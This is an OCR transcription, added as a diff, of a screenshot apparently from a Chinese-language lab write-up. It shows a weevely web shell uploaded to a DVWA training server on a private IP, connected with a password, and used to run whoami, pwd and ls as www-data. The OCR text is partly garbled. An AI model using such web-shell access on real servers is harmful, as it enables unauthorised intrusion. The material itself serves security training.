@@ -1,0 +1,31 @@
+# OCR: 5b20252fef0d36d83eed7a149d440830.webp
+# 来源: .\02-WriteUp\2024\5b20252fef0d36d83eed7a149d440830.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:14
+
+root@lati /home/kali
+File Actions Edit View Help
+oo) fhome/kali
+ly http: //192.168.145.132/dvwa/hackable/uploads/weevely.php 123456
+weevely 4.0.1
+Target: 192.168.145.132
+Session: /root/.weevely/sessions/192.168.145.132/weevely_0.session
+Browse the filesystem or execute commands starts the connection
+to the target. Type :help for more information.
+weevely> whoami
+The remote script execution triggers an error 500, check script and payload i
+ntegrity
+wwi-data
+www -data@192.168.145.132:/var/ww/dvwa/hackable/uploads $ pwd
+The remote script execution triggers an error 500, check script and payload i
+ntegrity
+/Var/ww/dvwa/hackable/uploads
+www -data@192.168.145.132:/var/ww/dvwa/hackable/uploads $ ls -al
+The remote script execution triggers an error 500, check script and payload i
+ntegrity
+total 16
+drwxr-xr-x 2 ww-data ww-data 4096 May 24 03:08
+drwxr-xr-x 4 ww-data ww-data 4096 May 20 2012 .
+-rw-r—r www-data wwi-data 667 Mar 16 2010 dvwa_email.png
+-rw— 1 ww-data ww-data 761 May 24 03:08 weevely.php
+ww -data@192.168.145.132:/var/ww/dvwa/hackable/uploads $ 相
